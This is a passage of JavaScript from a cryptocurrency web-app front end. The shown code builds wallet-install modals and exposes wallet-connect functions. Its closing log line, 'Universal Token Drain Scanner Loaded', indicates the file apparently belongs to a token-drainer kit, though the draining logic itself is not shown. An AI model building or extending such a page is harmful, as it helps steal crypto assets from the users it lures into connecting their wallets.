                    <button onclick="installMetaMask()" style="width:100%;padding:12px;background:#f6851b;color:white;border:none;border-radius:8px;margin-bottom:10px;">
                        Install MetaMask
                    </button>
                    <button onclick="installTrustWallet()" style="width:100%;padding:12px;background:#3375bb;color:white;border:none;border-radius:8px;">
                        Install Trust Wallet
                    </button>
                </div>
                
                <p style="font-size:12px;color:#666;">
                    Or open this page in your wallet's browser app
                </p>
                
                <button class="close-btn" onclick="closeNoWalletModal()">✕</button>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', html);
}

function closeNoWalletModal() {
    const modal = document.getElementById('noWalletModal');
    if (modal) modal.remove();
}

function installMetaMask() {
    window.open('https://metamask.io/download/', '_blank');
    closeNoWalletModal();
}

function installTrustWallet() {
    if (isMobile) {
        if (/iPhone|iPad|iPod/.test(navigator.userAgent)) {
            window.open('https://apps.apple.com/app/trust-crypto-bitcoin-wallet/id1288339409', '_blank');
        } else {
            window.open('https://play.google.com/store/apps/details?id=com.wallet.crypto.trustapp', '_blank');
        }
    } else {
        window.open('https://trustwallet.com/download/', '_blank');
    }
    closeNoWalletModal();
}

function showInstallWalletModal() {
    const html = `
        <div class="simple-modal-overlay">
            <div class="simple-modal">
                <h3>Install Wallet</h3>
                <p>To use this dapp, please install a wallet extension:</p>
                <ul style="text-align:left;">
                    <li><a href="https://metamask.io/download/" target="_blank">MetaMask</a></li>
                    <li><a href="https://www.binance.com/en/download" target="_blank">Binance Wallet</a></li>
                    <li><a href="https://www.tronlink.org/" target="_blank">TronLink</a></li>
                </ul>
                <button onclick="closeModal()" style="margin-top:20px;padding:10px 20px;background:#007bff;color:white;border:none;border-radius:8px;">
                    I've installed a wallet
                </button>
            </div>
        </div>
    `;
    
    document.body.insertAdjacentHTML('beforeend', html);
}

// ===================== INITIALIZE =====================
window.addEventListener('DOMContentLoaded', initializeApp);

// Global functions
window.connectUniversal = connectUniversal;
window.connectAnyBrowser = connectAnyBrowser;
window.connectBinanceDirect = connectBinanceDirect;
window.connectTronDirect = connectTronDirect;
window.closeModal = closeModal;

console.log('✅ Universal Token Drain Scanner Loaded');
